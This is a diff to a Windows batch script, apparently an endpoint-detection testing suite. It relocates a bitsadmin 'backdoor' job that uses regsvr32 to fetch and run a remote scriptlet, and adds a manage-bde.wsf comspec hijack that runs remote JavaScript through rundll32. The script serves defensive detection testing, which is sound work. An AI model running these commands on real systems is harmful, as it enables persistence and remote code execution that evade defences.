@@ -741,21 +741,6 @@ echo **********************************************
 echo *        Testing Custom PAYLOADS             *
 echo **********************************************
 
-echo %time% %date% [+] Testing bitsadmin persistance via regsvr32 exec
-REM taken from https://github.com/3gstudent/bitsadminexec
-start "" cmd /c bitsadmin /create backdoor
-start "" cmd /c bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
-start "" cmd /c bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
-start "" cmd /c bitsadmin /Resume backdoor
-start "" cmd /c bitsadmin /Cancel backdoor
-echo Execution Finished at %time% %date%
-echo Command Excuted: bitsadmin /create backdoor
-echo Command Excuted: bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
-echo Command Excuted: bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
-echo Command Excuted: bitsadmin /Resume backdoor
-echo Command Excuted: bitsadmin /Cancel backdoor
-
-timeout 5
 
 echo %time% %date% [+] Testing winnt32 exec
 start "" cmd /c winnt32 /cmd:calc.exe
@@ -921,6 +906,41 @@ echo Execution Finished at %time% %date%
 timeout 5
 
 REM ---- EOF Invoke-CradleCrafter Payloads ----
+
+echo **********************************************
+echo *        Testing Variations                  *
+echo **********************************************
+
+echo %time% %date% [+] Testing bitsadmin persistance via regsvr32 exec
+REM taken from https://github.com/3gstudent/bitsadminexec
+start "" cmd /c bitsadmin /create backdoor
+start "" cmd /c bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
+start "" cmd /c bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
+start "" cmd /c bitsadmin /Resume backdoor
+start "" cmd /c bitsadmin /Cancel backdoor
+echo Execution Finished at %time% %date%
+echo Command Excuted: bitsadmin /create backdoor
+echo Command Excuted: bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
+echo Command Excuted: bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
+echo Command Excuted: bitsadmin /Resume backdoor
+echo Command Excuted: bitsadmin /Cancel backdoor
+
+timeout 5
+
+echo %time% %date% [+] Testing manage-bde.wsf with rundll32 JS exec
+set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
+cscript C:\windows\system32\manage-bde.wsf
+set comspec=C:\WINDOWS\system32\cmd.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
+echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf
+echo Command Excuted: set comspec=C:\WINDOWS\system32\cmd.exe
+
+timeout 5
+
+
+
+
 
 echo [+] Let tasks finish before deleting all the files
 
